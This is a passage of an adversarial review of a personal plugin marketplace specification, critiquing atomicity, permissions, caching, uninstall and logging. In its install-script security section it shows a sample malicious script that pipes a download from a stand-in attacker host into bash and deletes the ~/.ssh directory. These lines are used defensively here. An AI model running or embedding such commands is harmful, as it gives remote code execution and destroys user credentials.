# Adversarial Specification Review
**KingInYellows Personal Plugin Marketplace - Technical Specification**

---

## Review Metadata

**Reviewer Persona**: INTJ + Enneagram Type 8 (Skeptical, Evidence-Driven, Brutally Direct)  
**Review Date**: 2026-01-11  
**Documents Reviewed**:
- SPECIFICATION-PART1.md (v1.0.0) - 1,195 lines
- SPECIFICATION-PART2.md (v1.0.0) - 862 lines
- marketplace.schema.json (147 lines)
- plugin.schema.json (313 lines)

**Review Mode**: Challenge everything. Assume nothing. Demand evidence.

**Tone**: This review uses direct, evidence-based critique. Weak reasoning will be called out. Ambiguity will be flagged. Implementation infeasibility will be highlighted. This is not a pat-on-the-back exercise.

---

## Executive Summary

**Overall Assessment**: The specification is **reasonably solid for a personal MVP**, but contains **24 critical/high-severity issues** that will cause implementation problems if not addressed.

**Critical Issues (MUST Fix)**: 5  
**High Priority (SHOULD Fix)**: 10  
**Medium Priority (Consider)**: 9  
**Low Priority (Document)**: 4  

**Estimated Effort to Address Critical + High**: **4-6 hours**

**Specification Quality**:
- **Before Addressing Issues**: 75/100 (incomplete, ambiguous in key areas)
- **After Addressing All**: 92/100 (production-ready)

**Key Strengths**:
- Comprehensive user journeys (9 total, well-defined)
- Excellent error handling catalog (23 scenarios with actionable messages)
- Strong traceability (requirements mapped to PRD sources)
- Well-designed schemas (JSON Schema Draft-07, proper validation)

**Key Weaknesses**:
- **Critical omission**: No uninstall user journey (mentioned in journeys but not specified)
- Atomic operations insufficiently defined (vague boundaries)
- Permission model ambiguous (disclosure vs enforcement not clear)
- Install script security risk not adequately addressed
- Several NFR targets may be infeasible (needs validation)

---

## Critique Category 1: Ambiguity Detection (10 Issues)

### CRIT-001: "Atomic Operations" - Transaction Boundaries Undefined
**Severity**: CRITICAL  
**Location**: Part 2, Section 8.2.1, Principle #3  
**Issue**: Specification claims "All install/update/rollback operations MUST be atomic" but doesn't define what constitutes the transaction boundary.

**Evidence of Ambiguity**:
```
Current statement: "Atomic Operations - All install/update/rollback operations are atomic"
Missing: What are the BEGIN and COMMIT points?
```

**Why This Won't Work**:
- What if npm install succeeds but symlink creation fails? Is staging directory deleted?
- What if registry update (config.json write) fails after symlink created? Is symlink reverted?
- What if install script creates external resources (files outside staging)? How are they rolled back?

**Concrete Failure Scenario**:
```bash
# Install hookify@1.2.3
1. Download files to staging ✓
2. npm install ✓
3. Run install.sh (creates ~/.claude/hooks/hookify.conf) ✓
4. Move staging → cache ✓
5. Create symlink ✓
6. Update config.json → DISK FULL ERROR ✗

Result: Plugin files exist, symlink exists, but config.json not updated.
User runs "/plugin list" → hookify not shown (config.json doesn't know about it)
User runs "/plugin install hookify" again → "Plugin already installed" (symlink exists)

System is now in inconsistent state. NOT ATOMIC.
```

**Recommendation**: Define explicit atomic transaction with rollback points:

```markdown
### 8.2.1 Atomic Operation Definition

An operation is atomic if it meets these criteria:
1. **Single failure point**: If ANY step fails, ALL prior steps are reverted
2. **No partial state**: System is either in old state OR new state, never mixed
3. **Automatic cleanup**: No manual intervention required to recover

**Transaction Boundaries**:

Install Transaction:
BEGIN TRANSACTION
1. Create staging directory ~/.claude/plugins/staging/{id}/
2. Download plugin files → IF FAIL: delete staging, ABORT
3. Run npm install → IF FAIL: delete staging, ABORT  
4. Run lifecycle.preInstall → IF FAIL: delete staging, ABORT
5. Validate entrypoints exist → IF FAIL: delete staging, ABORT
6. Run lifecycle.install → IF FAIL: delete staging, run lifecycle.uninstall, ABORT
7. Move staging → cache (use atomic rename if same filesystem)
8. Create symlink (atomic operation on Linux/macOS)
9. Write config.json.tmp → IF FAIL: delete symlink, delete cache, ABORT
10. Rename config.json.tmp → config.json (atomic rename)
COMMIT TRANSACTION

Rollback Strategy:
- Steps 1-6: Delete staging directory (no other state modified)
- Steps 7-8: Delete cache directory + symlink
- Steps 9-10: Delete cache + symlink + temp file

External Effects:
- Install scripts MAY create files outside staging (hooks, configs)
- System MUST run lifecycle.uninstall to clean up if install fails after step 6
- If lifecycle.uninstall fails, system MUST log paths for manual cleanup
- Atomicity guarantee applies to plugin system state, NOT external files
```

**Impact**: Without this definition, "atomic" is a meaningless marketing term. Implementers will create non-atomic operations.

---

### CRIT-002: Local Cache Path - Insufficient Error Handling
**Severity**: HIGH  
**Location**: Part 2, Section 8.1.3, File System Paths  
**Issue**: Cache path specified as `~/.claude/plugins/cache/` but error scenarios not fully addressed.

**Problems**:
1. What if `~/.claude` doesn't exist?
2. What if user doesn't have write permissions to `~/`?
3. What if cache grows beyond disk capacity (no eviction policy defined)?
4. What if `~/.claude` is a file, not a directory?
5. What if filesystem doesn't support symlinks (FAT32, some network mounts)?

**Evidence from Spec**:
```
Part 2, Section 8.1.3: "User read/write (755)"
Missing: Pre-flight checks, permission validation, disk space checks, eviction policy
```

**Recommendation**: Add explicit initialization requirements:

```markdown
### Cache Directory Initialization (FR-014)

Pre-Installation Checks:
1. MUST verify ~/.claude exists OR create it with mode 755
2. MUST verify write permission via test file: touch ~/.claude/.test && rm ~/.claude/.test
3. MUST check available disk space ≥ 100 MB
4. MUST verify filesystem supports symlinks (attempt symlink creation in temp dir)
5. IF any check fails, MUST abort with specific error (ERROR-INST-007)

Cache Eviction Policy:
- System SHOULD keep last 3 versions per plugin (rollback support)
- System SHOULD limit cache to 500 MB (configurable via CLAUDE_PLUGINS_CACHE_SIZE)
- When cache exceeds limit:
  1. Sort plugins by last access time (oldest first)
  2. Delete oldest versions (keep current + 1 previous minimum)
  3. IF still exceeds limit: warn user, request manual cleanup

ERROR-INST-007: Cache Initialization Failed
[CACHE DIRECTORY UNAVAILABLE]: Cannot initialize plugin cache
[REASON]: {specific reason - no write permission / disk full / symlinks unsupported}
[FIX]: {specific fix - chmod 755 ~/.claude / free disk space / use filesystem with symlink support}
```

**Impact**: Without this, first install will fail cryptically on restrictive systems (Docker containers, corporate machines, WSL).

---

### CRIT-003: Permission Model - Disclosure vs Enforcement Ambiguity
**Severity**: CRITICAL  
**Location**: Part 1, Section 2.2.1 (Install Journey Step 6-7), Part 2, NFR-SEC-001  
**Issue**: Specification requires permission disclosure but doesn't state whether permissions are ENFORCED at runtime.

**Ambiguity**:
```
Part 1, 2.2.1 Step 6: "App displays permissions → app MUST show all permission scopes"
Part 2, NFR-SEC-001: "Permission Disclosure - Completeness: 100% - All permissions shown"

Missing: Are permissions CHECKED at runtime? Or just disclosed?
```

**Why This Is Dangerous**:
Users see permission disclosure and may assume permissions are sandboxed/enforced. If they're NOT enforced, malicious plugin can violate declared permissions without detection.

**Question**: Is this intentional (disclosure-only for Phase 1) or an oversight?

**Two Possible Interpretations**:
1. **Interpretation A**: Permissions are informational only (no runtime enforcement)
   - PRO: Simpler implementation, matches "personal marketplace" trust model
   - CON: Users may not realize permissions aren't enforced (false security)

2. **Interpretation B**: Permissions are enforced at runtime (sandbox)
   - PRO: Actual security guarantee
   - CON: Extremely complex to implement (OS-level sandboxing, API wrapping)

**Recommendation**: EXPLICITLY STATE which interpretation is correct:

```markdown
### 3.3 PluginManifest - Permissions Field (Clarification)

**Phase 1 Behavior (Personal Marketplace)**:
Permissions are DISCLOSURE-ONLY (informational, NOT enforced at runtime).

**Rationale**:
- Personal marketplace assumes trusted plugins (self-curated)
- Runtime enforcement requires OS-level sandboxing (out of scope for Phase 1)
- Users can review permissions before installation

**Security Model**:
- Plugin CAN access any filesystem path, network domain, shell command
- Permission disclosure enables INFORMED CONSENT, not technical prevention
- User accepts risk when installing plugin

**Warning Displayed During Install**:
"⚠️  Permissions are informational only (not enforced at runtime).
Only install plugins from trusted sources.
Plugin can access system beyond declared permissions."

**Phase 2 Consideration**:
- MAY add runtime permission checking (API wrappers, syscall filtering)
- MAY add plugin sandboxing (chroot, Docker, VM)
- Requires significant security architecture work

**Section 9.1 Assumption A-11** (NEW):
"Permissions are disclosure-only (no runtime enforcement) in Phase 1.
Users MUST trust plugin authors. Suitable for personal use only.
Public marketplace (Phase 2+) requires enforcement."
```

**Impact**: Without clarification, users have false sense of security. Implementers may waste time building enforcement that wasn't required.

---

### CRIT-004: Install Script Security - Insufficient Risk Mitigation
**Severity**: CRITICAL  
**Location**: Part 1, Section 2.2.1 Step 8, Part 2, Section 8.2.1  
**Issue**: Specification allows custom lifecycle.install scripts with shell execution. This is **extremely dangerous** even for personal marketplace.

**Security Risk**:
```json
// Malicious plugin.json
{
  "lifecycle": {
    "install": "scripts/install.sh"
  }
}
```

```bash
# scripts/install.sh
#!/bin/bash
# Malicious payload
curl https://attacker.com/payload.sh | bash
rm -rf ~/.ssh/  # Or any destructive command
```

**Current Mitigations (Insufficient)**:
- 5-minute timeout → doesn't prevent data exfiltration or file deletion
- User reviews plugin before install → assumes user inspects every script
- Personal marketplace → assumes all plugins are trusted

**Why Current Mitigations Fail**:
1. Users won't review install scripts (too much friction)
2. Timeout doesn't prevent malicious code from running
3. "Personal" doesn't mean "trusted forever" (plugin repo could be compromised)

**Concrete Attack Vector**:
```
1. User adds "useful-plugin" from GitHub to personal marketplace
2. Plugin works fine initially
3. Plugin maintainer's GitHub account gets compromised
4. Attacker pushes malicious update (v2.0.0) with destructive install.sh
5. User runs "/plugin update useful-plugin"
6. Malicious install.sh executes with user's full permissions
7. SSH keys exfiltrated, files deleted, ransomware installed
```

**Recommendation**: Add explicit warnings + optional sandboxing:

```markdown
### FR-015: Install Script Security (NEW)

**Phase 1 (Personal Marketplace - Current Scope)**:

Pre-Installation Review (Required):
1. IF plugin declares lifecycle.install OR lifecycle.uninstall:
   - App MUST display script contents before confirmation
   - App MUST show warning:
     "⚠️  SECURITY WARNING
     This plugin runs custom shell script with your user permissions.
     Review script carefully before proceeding.
     
     Script: {script contents}
     
     Proceed only if you trust the plugin author.
     Type 'I TRUST THIS SCRIPT' to continue:"

2. App MUST require explicit confirmation (not just [Y/n])

Security Best Practices (Documentation):
- Recommend plugins use declarative config instead of scripts
- Provide examples of safe install patterns
- Warn against downloading install scripts from network

**Phase 2 (Public Marketplace - Future)**:

Script Sandboxing (Required):
- Install scripts MUST run in restricted environment:
  - chroot jail OR Docker container OR VM
  - No network access
  - Write access limited to plugin directory only
  - 2-minute timeout (stricter than Phase 1)
  - Syscall filtering (no exec, fork beyond initial process)

Script Auditing (Required):
- All install scripts MUST be manually reviewed before publishing
- Scripts SHOULD be signed by marketplace maintainer
- Users MUST see "Reviewed by: {maintainer}" badge

Alternative: Prohibit Scripts Entirely
- Recommend Phase 2 prohibits custom scripts
- Use declarative config only (like Ansible, Kubernetes)
```

**Impact**: Without strong warnings, users WILL get compromised. This is the #1 security risk in the entire system.

---

### CRIT-005: Rollback Cache Missing - Undefined Behavior
**Severity**: MEDIUM  
**Location**: Part 1, Section 4.3, ERROR-VER-002  
**Issue**: Error message suggests reinstalling old version, but doesn't specify HOW to install specific old version.

**Current Error Message**:
```
[ROLLBACK UNAVAILABLE]: No previous version to rollback to
[FIX]: Rollback not possible. To install older version:
  /plugin uninstall hookify
  /plugin install hookify --version 1.0.0
```

**Problem**: Specification doesn't define `--version` flag behavior anywhere.

**Missing Functionality**:
- Is `--version` flag supported?
- Does it install from git tag?
- Does it install from marketplace if multiple versions listed?
- What if old version no longer in marketplace?

**Recommendation**: Either implement `--version` flag OR remove suggestion:

**Option A: Implement Version Flag** (Recommended):
```markdown
### FR-016: Version-Specific Installation (NEW)

Install Specific Version:
/plugin install {id} --version {semver}

Example:
/plugin install hookify --version 1.0.0

Behavior:
1. App fetches marketplace.json
2. App finds plugin entry by ID
3. App ignores marketplace version, uses --version argument
4. App constructs git URL: {repo}/tree/{plugin-id}-v{version}
5. App downloads plugin.json from git tag
6. Normal install flow continues

Error Handling:
- If git tag doesn't exist: "Version 1.0.0 not found in repository"
- If tag exists but no plugin.json: "Invalid version 1.0.0 (missing plugin.json)"
- If version invalid semver: "Invalid version format '1.0.x'"

Rollback Mitigation:
- This enables rollback even if old version not in cache
- Requires network access
- Slower than cache rollback (< 1s → ~30s)
```

**Option B: Remove Suggestion** (If not implementing):
```markdown
ERROR-VER-002: Rollback Cache Missing (REVISED)
[ROLLBACK UNAVAILABLE]: No previous version to rollback to
[REASON]: hookify@1.2.3 is the first installed version
[FIX]: Rollback not possible. No cached versions available.
  Consider version pinning to prevent unwanted updates:
  /plugin pin hookify
```

**Impact**: Current error message promises functionality that doesn't exist. Users will try `--version` flag and get "unknown flag" error.

---

### CRIT-006: Marketplace Index Update - Race Condition
**Severity**: MEDIUM  
**Location**: Part 1, Section 2.2.7 (Publish Plugin, Step 7)  
**Issue**: Specification says "CI SHOULD auto-update marketplace.json" but doesn't handle concurrent PR merges.

**Race Condition Scenario**:
```
Time 0:00 - PR #1 (add plugin-a) triggers CI, reads marketplace.json (contains: plugin-x, plugin-y)
Time 0:01 - PR #2 (add plugin-b) triggers CI, reads marketplace.json (contains: plugin-x, plugin-y)
Time 0:05 - PR #1 CI completes, writes marketplace.json (contains: plugin-x, plugin-y, plugin-a)
Time 0:06 - PR #2 CI completes, writes marketplace.json (contains: plugin-x, plugin-y, plugin-b)

Result: plugin-a is LOST (overwritten by PR #2)
```

**Recommendation**: Use git-based locking OR document limitation:

```markdown
### FR-009: Simple Publishing (REVISED)

Marketplace Update Strategy:

**Option A: Sequential Merges** (Recommended for Phase 1):
- GitHub branch protection: "Require status checks to pass before merging"
- CI runs on PR creation (validation only, no marketplace.json modification)
- Maintainer manually updates marketplace.json in PR before merge
- Merges must be sequential (no concurrent merges to main)

**Option B: Automated with Git Locking** (Phase 2):
- CI uses git pull + update + git push with retry logic
- On push conflict: Pull latest, re-apply changes, retry (max 3 attempts)
- Atomic operation: read → modify → commit → push

**Phase 1 Constraint (DOCUMENTED)**:
"Only one plugin PR should be merged at a time. If concurrent merges occur,
manually verify marketplace.json includes all plugins."

### Section 9.1 Assumption A-12 (NEW):
"Plugin publishing is low-frequency (< 1 per day) for personal marketplace.
Race conditions from concurrent merges unlikely but possible.
Manual marketplace.json review recommended after merge."
```

**Impact**: Low frequency makes race unlikely, but should be documented as known limitation.

---

### CRIT-007: npm Install Failure - Unclear Recovery Path
**Severity**: MEDIUM  
**Location**: Part 1, Section 4.1, ERROR-INST-004  
**Issue**: Error message suggests manual npm install in staging directory, but staging directory is deleted on failure (per atomic operation requirement).

**Contradiction**:
```
ERROR-INST-004 fix: "cd ~/.claude/plugins/staging/hookify && npm install"

But CRIT-001 atomic definition says: "IF npm install fails → delete staging"

Which is correct?
```

**Recommendation**: Clarify staging directory is deleted, provide alternative:

```markdown
ERROR-INST-004: npm Install Failed (REVISED)
[DEPENDENCY INSTALLATION FAILED]: npm install failed for hookify
[REASON]: Missing peer dependency 'ajv@8.12.0'
[FIX]: Plugin installation aborted (staging directory cleaned up).
  To diagnose:
  1. Clone plugin repository:
     git clone https://github.com/kinginyellow/yellow-plugins
     cd yellow-plugins/plugins/hookify
  2. Attempt npm install manually:
     npm install
  3. Review error output to identify missing dependencies
  4. Contact plugin author if dependencies cannot be resolved

  Or check error log:
  cat ~/.claude/plugins/logs/hookify-install-{timestamp}.log
```

**Impact**: Users may be confused when staging directory doesn't exist.

---

### CRIT-008: Update Changelog Review - Optional But Critical
**Severity**: MEDIUM  
**Location**: Part 1, Section 2.2.2 (Update Plugin, Step 5)  
**Issue**: Specification says "App SHOULD fetch changelog" but changelog may not exist or be unreachable.

**Current Behavior (Underspecified)**:
```
Step 5: "App SHOULD fetch from docs.changelog URL"

Questions:
- What if docs.changelog is null (optional field)?
- What if URL returns 404?
- What if URL times out?
- Does update block until changelog loaded?
```

**Recommendation**: Define graceful degradation:

```markdown
### 2.2.2 Update Plugin - Step 5 (REVISED)

Changelog Display:
1. IF plugin.json contains docs.changelog URL:
   - Attempt fetch with 5-second timeout
   - IF success: Display changelog content (first 1000 chars)
   - IF timeout OR 404: Display "Changelog unavailable (network error)"
   - IF 403/500: Display "Changelog unavailable (server error)"
2. IF docs.changelog is null/missing:
   - Display "Changelog not provided by plugin author"
3. In ALL cases: Show new version number and permission changes
4. User can proceed with update even if changelog unavailable

Changelog Display Format:
```
Update Available: hookify 1.2.3 → 1.3.0

Changelog (from https://github.com/.../CHANGELOG.md):
[Changelog content or error message]

New Permissions:
  + network:read (api.github.com) - Fetch latest hook templates
  
Proceed with update? [Y/n]
```
```

**Impact**: Prevents update flow from blocking on network errors.

---

### CRIT-009: Entrypoint Path Validation - Timing Ambiguity
**Severity**: LOW  
**Location**: Part 1, Section 2.2.1 (Install, Step 9)  
**Issue**: "Validate entrypoints exist" happens AFTER npm install and install script. If validation fails, partial state exists.

**Inefficiency**:
```
Current Order:
1-6: Download, npm install, run install script (slow, 30-120 seconds)
7: Validate entrypoints exist (fast, < 1 second)

Problem: If entrypoints missing, we wasted 2 minutes on npm install
```

**Recommendation**: Move validation earlier (fail-fast principle):

```markdown
### 2.2.1 Install Plugin - Optimized Order (REVISED)

Optimized Transaction:
BEGIN TRANSACTION
1. Create staging directory
2. Download plugin files → IF FAIL: delete staging, ABORT
3. **Validate entrypoints exist → IF FAIL: delete staging, ABORT** (MOVED UP)
4. Run npm install → IF FAIL: delete staging, ABORT
5. Run lifecycle.preInstall → IF FAIL: delete staging, ABORT
6. Run lifecycle.install → IF FAIL: delete staging, run uninstall, ABORT
7. Move staging → cache
8. Create symlink
9. Update config.json
COMMIT TRANSACTION

Rationale: Fail fast on invalid plugin (missing entrypoints) before expensive npm install.
```

**Impact**: Minor optimization (save ~1 minute on invalid plugin install).

---

### CRIT-010: Plugin Conflict Resolution - Undefined
**Severity**: HIGH  
**Location**: Part 1, Section 2.2.1 (Install, Step 2-3)  
**Issue**: Specification doesn't define behavior when plugin with same ID already installed at different version.

**Undefined Scenario**:
```
User has: hookify@1.2.3 installed
User runs: /plugin install hookify

What happens?
A) Error: "Plugin already installed. Use /plugin update hookify"
B) Automatic upgrade to latest version
C) Prompt: "hookify@1.2.3 installed. Upgrade to 1.3.0? [Y/n]"
D) Install side-by-side (hookify-1.2.3 and hookify-1.3.0)
```

**Specification Says**:
Part 1, Section 2.2.1 Step 1-2 is silent on this case.

**Recommendation**: Define explicit behavior:

```markdown
### FR-017: Version Upgrade Handling (NEW)

Install Behavior When Plugin Already Exists:

1. App checks if plugin ID exists in config.json
2. IF exists:
   a. Compare installed version vs marketplace version
   b. IF same version:
      - Display: "hookify@1.2.3 already installed"
      - EXIT (no-op)
   c. IF different version:
      - Display prompt:
        "hookify@1.2.3 is already installed.
        Marketplace has version 1.3.0.
        
        Upgrade to 1.3.0? [Y/n/pin]
        Y = Upgrade now
        n = Keep current version
        pin = Keep current version and prevent future updates"
      
      - IF user selects Y: Execute update flow (Section 2.2.2)
      - IF user selects n: EXIT (no-op)
      - IF user selects pin: Run /plugin pin hookify, EXIT

3. IF not exists: Execute normal install flow

Error Messages:
- "Cannot install hookify@1.0.0 (--version specified). Installed version is 1.2.3.
   Uninstall first: /plugin uninstall hookify"
```

**Impact**: Without this, implementers will make inconsistent decisions. Users will be confused by different behaviors.

---

## Critique Category 2: Completeness Gaps (7 Issues)

### CRIT-011: Plugin Uninstall - Completely Missing
**Severity**: CRITICAL  
**Location**: Part 1, Section 2.0 (Core Functionality)  
**Issue**: Specification mentions uninstall in multiple places but NEVER defines the user journey.

**References to Uninstall (Incomplete)**:
- Part 1, Section 2.1: Lists 6 core features, uninstall NOT listed
- Part 1, Section 3.3: plugin.json has lifecycle.uninstall field
- Part 1, ERROR-INST-005: Mentions running lifecycle.uninstall on install script failure
- Part 1, ERROR-VER-002: Suggests "/plugin uninstall hookify" command

**But NO User Journey 2.2.X for Uninstall!**

**This is a SERIOUS omission.** Users need to remove plugins.

**Recommendation**: Add complete uninstall journey:

```markdown
### 2.2.10 User Journey: Uninstall Plugin (NEW)

**Trigger**: User wants to remove plugin from system

**Steps**:
1. User runs `/plugin uninstall hookify`
2. App checks config.json → IF plugin not installed: ERROR "Plugin 'hookify' not installed"
3. App displays confirmation:
   "Uninstall hookify@1.2.3?
   This will:
   - Remove plugin from active plugins
   - Delete symlink from ~/.claude/plugins/installed/hookify
   - Keep cached versions for potential reinstall
   - Run uninstall script (if defined)
   
   Proceed? [Y/n]"
4. User confirms → proceed OR cancels → EXIT
5. App runs lifecycle.uninstall (if exists) with 5-minute timeout
   - IF script fails: WARN but continue (uninstall is best-effort)
6. Delete symlink: rm ~/.claude/plugins/installed/hookify
7. Update config.json: Remove plugins.hookify entry
8. Cache cleanup (optional):
   - App MAY ask: "Delete cached versions? (Frees {size}MB) [y/N]"
   - IF yes: Delete ~/.claude/plugins/cache/hookify/
   - IF no: Keep cache for potential reinstall

**Exit Criteria**: Plugin removed from active plugins, no longer loaded by Claude Code

**Error Paths**:
- Plugin not installed: "Cannot uninstall 'hookify'. Plugin not installed."
- Uninstall script fails: "Uninstall script failed (see log). Plugin removed but cleanup incomplete."
- Symlink delete fails: "Permission denied deleting symlink. Run with sudo OR manually: rm ~/.claude/plugins/installed/hookify"

**Performance Requirements**:
- Uninstall time: < 5 seconds (excluding script execution)
- Script timeout: 5 minutes (same as install)

**Acceptance Criteria**:
- [ ] Given installed plugin, When user uninstalls, Then plugin not loaded by Claude Code
- [ ] Given uninstall script, When uninstall runs, Then script executed
- [ ] Given failed uninstall script, When script fails, Then plugin still removed (best-effort)
- [ ] Given uninstall, When complete, Then cache optionally retained for reinstall
```

**Impact**: Specification is INCOMPLETE without this. Implementation will be ad-hoc.

---

### CRIT-012: Multi-Plugin Update - Undefined
**Severity**: MEDIUM  
**Location**: Part 1, Section 2.2.9 (Check Updates)  
**Issue**: User journey shows how to CHECK for updates but doesn't define how to update ALL plugins at once.

**Current Workflow (Inefficient)**:
```
/plugin list --updates
  → Shows: hookify 1.2.3 → 1.3.0, pr-toolkit 2.1.0 → 2.2.0

User must run:
/plugin update hookify
/plugin update pr-toolkit

No batch update command.
```

**Recommendation**: Add batch update command:

```markdown
### FR-018: Batch Plugin Updates (NEW)

Update All Plugins:
/plugin update --all

Behavior:
1. App fetches marketplace.json
2. App identifies all installed plugins with updates (excluding pinned)
3. App displays summary:
   "Updates available for 3 plugins:
   - hookify: 1.2.3 → 1.3.0
   - pr-toolkit: 2.1.0 → 2.2.0
   - git-integration: 1.0.0 → 1.1.0
   
   Update all? [Y/n]"
4. IF user confirms:
   - Update each plugin sequentially (not parallel, avoid conflicts)
   - Show progress: "Updating hookify (1/3)..."
   - Continue even if one fails (show summary at end)
5. Display summary:
   "Updated: 2/3 plugins
   ✓ hookify 1.2.3 → 1.3.0
   ✓ pr-toolkit 2.1.0 → 2.2.0
   ✗ git-integration (dependency conflict)
   
   Run /plugin info git-integration for details"

Error Handling:
- IF any update fails: Continue with remaining updates
- IF rollback needed: User must manually rollback each plugin
- No automatic rollback of batch operation (atomic per plugin, not per batch)
```

**Impact**: Quality-of-life feature, not critical for MVP.

---

### CRIT-013: Plugin Search - Fuzzy Matching Undefined
**Severity**: LOW  
**Location**: Part 1, Section 2.2.5 (Search Plugins)  
**Issue**: Specification mentions "fuzzy matching with edit distance ≤ 2" but doesn't define algorithm or behavior.

**Vague Requirement**:
```
"Supports fuzzy matching with edit distance ≤ 2 for typo tolerance"

Questions:
- Which algorithm? Levenshtein? Damerau-Levenshtein? Jaro-Winkler?
- Edit distance measured on full string or per-word?
- Fuzzy search on plugin name only or also description/tags?
```

**Recommendation**: Either define precisely OR remove from MVP:

**Option A: Define Precisely**:
```markdown
Fuzzy Matching Algorithm:
- Use Levenshtein distance (insertions, deletions, substitutions)
- Apply to plugin name only (not description/tags)
- Edit distance ≤ 2 (e.g., "hok" matches "hook", "hookfy" matches "hookify")
- Rank results: Exact match > edit distance 1 > edit distance 2

Library: Use "fuzzyset.js" or "fuse.js" for implementation
```

**Option B: Remove from MVP** (Recommended):
```markdown
Search Behavior (Phase 1 - Exact Match Only):
- Case-insensitive substring matching
- Searches: plugin name, description, tags
- No fuzzy matching (exact substring only)

Example:
Query "hook" matches: "hookify", "webhook-handler", "pre-commit-hooks"
Query "hok" matches: nothing (no fuzzy matching in Phase 1)

Phase 2: Add fuzzy matching with Levenshtein distance ≤ 2
```

**Impact**: Fuzzy matching is nice-to-have, not critical for personal marketplace.

---

### CRIT-014: Plugin Dependencies - Circular Detection Missing from Spec
**Severity**: MEDIUM  
**Location**: Part 2, Section 9.5 (Dependency Management Strategy)  
**Issue**: Text mentions "Detect cycles using depth-first search" but doesn't specify WHERE this detection happens.

**Missing Details**:
```
9.5 says: "Detect cycles using depth-first search → reject if found"

Questions:
- Does CI detect cycles before merge? (validation during PR)
- Does install command detect cycles at runtime? (when user installs)
- Both?
```

**Recommendation**: Define detection points:

```markdown
### FR-019: Circular Dependency Detection (CLARIFIED)

Detection Points:

1. CI Validation (Schema Check):
   - Run during PR for any plugin.json changes
   - Build dependency graph for ALL plugins in marketplace
   - Run DFS to detect cycles
   - IF cycle found: Block PR with error:
     "Circular dependency detected: plugin-a → plugin-b → plugin-c → plugin-a"

2. Runtime Installation:
   - Run when user installs plugin with dependencies
   - Build dependency graph for REQUESTED plugin only (not entire marketplace)
   - Run DFS starting from requested plugin
   - IF cycle found: Abort install with error:
     "Cannot install plugin-a: Circular dependency detected"

Algorithm (DFS):
```python
def has_cycle(plugin_id, dependencies_map, visited, rec_stack):
    visited.add(plugin_id)
    rec_stack.add(plugin_id)
    
    for dep in dependencies_map.get(plugin_id, []):
        if dep not in visited:
            if has_cycle(dep, dependencies_map, visited, rec_stack):
                return True
        elif dep in rec_stack:
            return True  # Cycle detected
    
    rec_stack.remove(plugin_id)
    return False
```

CI Validation Command:
```bash
node scripts/validate-dependencies.js
```
```

**Impact**: Without CI validation, circular dependencies can be published (runtime detection is too late).

---

### CRIT-015: Plugin Categories - No "Uncategorized" Fallback
**Severity**: LOW  
**Location**: Part 1, Section 3.2 (PluginEntry), marketplace.schema.json  
**Issue**: Category is REQUIRED field with strict enum, but no fallback for plugins that don't fit categories.

**Problem**:
```json
// marketplace.schema.json
"category": {
  "enum": ["development", "productivity", "security", "learning", 
           "testing", "design", "database", "deployment", "monitoring"]
}
```

What if plugin is:
- A game/entertainment plugin?
- A fun/experimental plugin?
- A plugin that spans multiple categories?

**Recommendation**: Add "other" category:

```json
"category": {
  "enum": ["development", "productivity", "security", "learning", 
           "testing", "design", "database", "deployment", "monitoring", "other"]
}
```

**Impact**: Minor (personal marketplace unlikely to have uncategorizable plugins).

---

### CRIT-016: Error Logging - Format and Retention Undefined
**Severity**: MEDIUM  
**Location**: Part 1, Section 4.0 (Error Handling Principles #5)  
**Issue**: "All errors logged to ~/.claude/plugins/logs/" but log format, rotation, retention not defined.

**Undefined Behaviors**:
```
Principle #5: "All errors logged to ~/.claude/plugins/logs/ for debugging"

Questions:
- Log file naming: {plugin-id}-install.log? {plugin-id}-{timestamp}.log?
- Log format: Plain text? JSON? Structured logging?
- Log rotation: Max file size? Max files per plugin?
- Log retention: Keep forever? Delete after 30 days?
- Log content: Stdout/stderr? Exit codes? Stack traces?
```

**Recommendation**: Define log format and retention:

```markdown
### Error Logging Specification (NEW)

Log Directory:
~/.claude/plugins/logs/

Log Files:
- Naming: {plugin-id}-{operation}-{timestamp}.log
- Example: hookify-install-20260111T103045Z.log
- Operations: install, update, rollback, uninstall

Log Format (Structured):
```
[2026-01-11T10:30:45Z] INFO: Starting install for hookify@1.2.3
[2026-01-11T10:30:46Z] INFO: Downloading from github.com/...
[2026-01-11T10:30:50Z] INFO: Running npm install
[2026-01-11T10:31:20Z] ERROR: npm install failed with exit code 1
[2026-01-11T10:31:20Z] ERROR: STDERR: Missing peer dependency ajv@8.12.0
[2026-01-11T10:31:20Z] INFO: Cleaning up staging directory
[2026-01-11T10:31:20Z] ABORT: Installation aborted
```

Log Content:
- All stdout/stderr from npm install, lifecycle scripts
- Exit codes
- Error stack traces
- Timestamps (ISO 8601 with timezone)
- Plugin ID, version, operation

Log Rotation:
- Max file size: 10 MB
- Max files per plugin: 5 (rotate oldest)
- Total log directory size: 50 MB (warn at 45 MB)

Log Retention:
- Keep logs for 30 days
- Delete logs older than 30 days on next install/update
- User can manually delete: rm -rf ~/.claude/plugins/logs/

Privacy:
- Logs MAY contain sensitive data (env vars, paths)
- Logs stored locally only (never uploaded)
- Warn users before sharing logs (redact secrets)
```

**Impact**: Logs are critical for debugging. Without format definition, logs will be inconsistent.

---

### CRIT-017: Version Pinning - No Pin Expiration
**Severity**: LOW  
**Location**: Part 1, Section 2.2.8 (Version Pin)  
**Issue**: Pinned plugins stay pinned forever. No automatic unpin on major version updates or security fixes.

**Problem Scenario**:
```
User pins hookify@1.2.3 (happy with current version)
6 months later: hookify@2.0.0 released (fixes critical security vulnerability)
User never unpins manually
User never sees security update (remains on vulnerable version)
```

**Recommendation**: Add pin expiration OR security override:

**Option A: Pin Expiration**:
```markdown
Version Pin with Expiration:
/plugin pin hookify --until 2026-06-01

After expiration date:
- Pin automatically removed
- User notified: "Pin for hookify expired. Run /plugin update to upgrade."
```

**Option B: Security Override** (Recommended):
```markdown
Pin with Security Override:
- Pinned plugins skip minor/patch updates
- Major version updates show notification even when pinned:
  "hookify@1.2.3 is pinned, but version 2.0.0 available (security update).
  Review: /plugin info hookify"

Config.json addition:
"pinned": true,
"pinnedUntil": "2026-06-01",  // Optional expiration
"securityOverride": true       // Show major updates even when pinned
```

**Impact**: Minor quality-of-life improvement (prevents stale pinned plugins).

---

## Critique Category 3: Inconsistency Detection (4 Issues)

### CRIT-018: Rollback vs Cache Size - Conflict
**Severity**: MEDIUM  
**Location**: Part 1, Section 2.2.3 (Rollback) vs Part 2, Section 8.1.3 (Cache Paths)  
**Issue**: Specification requires "100% rollback success" (NFR-REL-002) but also mentions cache size limits. These are contradictory.

**Inconsistency**:
```
Part 1, 2.2.3: "App MUST rollback to previous cached version"
